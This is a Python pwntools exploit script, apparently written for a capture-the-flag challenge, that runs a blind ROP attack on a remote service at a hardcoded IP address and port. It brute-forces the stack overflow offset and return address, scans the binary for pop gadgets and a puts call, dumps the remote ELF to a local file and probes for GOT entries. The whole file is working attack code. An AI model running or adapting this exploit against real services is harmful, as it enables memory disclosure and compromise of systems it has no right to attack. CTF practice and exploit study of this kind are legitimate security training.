from socket import timeout
import pwn
# Global Variables
HOST = "34.159.129.6"
PORT = 30550
BINARY_BASE = 0x400000
OFFSET = 88
RIP = 0x40070a
DUMP_FUNC = BINARY_BASE + 1806
BROP_GADGET = 0x4007ba
CALL_PUTS = 0x400550


def Test():
    io = pwn.remote(HOST, PORT)
    io.recvuntil(b'?\n')
    payload = b'A'*OFFSET
    payload += pwn.p64(BROP_GADGET + 9)  # pop rdi
    payload += pwn.p64(BINARY_BASE)
    payload += pwn.p64(0x40071f)
    io.send(payload)
    mssg = io.recvall()
    print(mssg)
    io.interactive()


def GetRipOffset():
    offset = 1
    while True:
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*offset
        io.recvuntil(b"?\n")
        io.send(payload)
        mssg = io.recvall()
        if b'No password' not in mssg:
            break
        offset += 1
    return offset-1


def BruteRip():
    rip = b''
    for i in range(0, 8):
        for j in range(0, 256):
            io = pwn.remote(HOST, PORT, level='critical')
            payload = b'A'*OFFSET + rip + pwn.p8(j)
            io.send(payload)
            mssg = io.recv()
            if b'No password' in mssg:
                rip += pwn.p8(j)
                pwn.log.success("RIP: " + hex(pwn.unpack(rip, 'all')))
                io.close()
                break
            io.close()
    return rip


def ScanText():
    for i in range(0, 0x1000):
        pwn.log.info("Scanning: " + hex(BINARY_BASE + i))
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET + pwn.p64(BINARY_BASE + i)
        io.send(payload)
        mssg = io.recv(0x1000)
        if mssg != b'Are you blind my friend?\n' and mssg != b'Are you blind my friend?':
            print("Offset", i, "Addr", BINARY_BASE+i, mssg)
        io.close()


def FindBropGadget():
    possible = []
    for i in range(BINARY_BASE, BINARY_BASE+0x1000):
        pwn.log.info("Scanning: " + hex(i))
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(i)  # Possible pop gadget
        payload += pwn.p64(0)  # pop rbx
        payload += pwn.p64(0)  # pop rbp
        payload += pwn.p64(0)  # pop r12
        payload += pwn.p64(0)  # pop r13
        payload += pwn.p64(0)  # pop r14
        payload += pwn.p64(0)  # pop r15
        payload += pwn.p64(DUMP_FUNC)
        io.send(payload)
        mssg = io.recv(0x1000, timeout=0.2)
        if b'Do not dump' in mssg:
            pwn.log.success("Found pop gadget at: " + hex(i))
            possible.append(i)
        io.close()
    return possible


def CheckBROP():
    # possible = [4196110, 4196282]
    # for i in possible:
    #     io = pwn.remote(HOST, PORT, level='critical')
    #     payload = b'A'*OFFSET
    #     payload += pwn.p64(i + 7)  # possilbe pop 2 gadget
    #     payload += pwn.p64(0)  # pop rsi
    #     payload += pwn.p64(0)  # pop r15
    #     payload += pwn.p64(DUMP_FUNC)
    #     io.send(payload)
    #     mssg = io.recv(0x1000, timeout=0.2)
    #     if b'Do not dump' in mssg:
    #         pwn.log.success("Found pop gadget at: " + hex(i))
    #     io.close()
    possible = [4196110, 4196282]
    for i in possible:
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(i + 9)  # possilbe pop 2 gadget
        payload += pwn.p64(0)  # pop rdi
        payload += pwn.p64(DUMP_FUNC)
        io.send(payload)
        mssg = io.recv(0x1000, timeout=0.2)
        if b'Do not dump' in mssg:
            pwn.log.success("Found pop gadget at: " + hex(i))
        io.close()


def FindLeakFunc():
    funcs = []
    for i in range(BINARY_BASE, BINARY_BASE+0x4000):
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(BROP_GADGET + 9)  # pop rdi
        payload += pwn.p64(BINARY_BASE)
        payload += pwn.p64(i)
        io.send(payload)
        mssg = io.recv(0x1000, timeout=0.2)
        if b'ELF' in mssg:
            pwn.log.success("Found leak func at: " + hex(i))
            funcs.append(i)
        io.close()
    return funcs


def LeakELF():
    f = open('leak.elf', 'wb')
    offset = BINARY_BASE
    while(offset < BINARY_BASE + 0x4000):
        pwn.log.info("At offset: " + hex(offset))
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(BROP_GADGET + 9)  # pop rdi
        payload += pwn.p64(offset)
        payload += pwn.p64(CALL_PUTS)
        io.recvuntil(b"?\n")
        io.send(payload)
        mssg = io.recvall().strip()
        print(hex(pwn.unpack(mssg, 'all')))
        if len(mssg) == 0:
            f.write(b'\x00')
            offset += 1
        else:
            f.write(mssg)
            offset += len(mssg)


def ScanGOT():
    l = []
    for i in range(0x600000, 0x600000+0x3000):
        pwn.log.info("Scanning: " + hex(i))
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(BROP_GADGET + 9)  # pop rdi
        payload += pwn.p64(i)
        payload += pwn.p64(CALL_PUTS)
        io.recvuntil(b"?\n")
        io.send(payload)
        mssg = io.recvall().strip()
        if b'\x7f' in mssg:
            print(hex(pwn.unpack(mssg, 'all')))
            pwn.log.success("Found Possible GOT at: " + hex(i))
            l.append(i)
        io.close()


if __name__ == "__main__":
    # len = GetRipOffset()
    # print(BruteRip())
    # ScanText()
    # print(FindBropGadget())
    # CheckBROP()
    # print(FindLeakFunc())
    # LeakELF()
    ScanGOT()
    # Test()
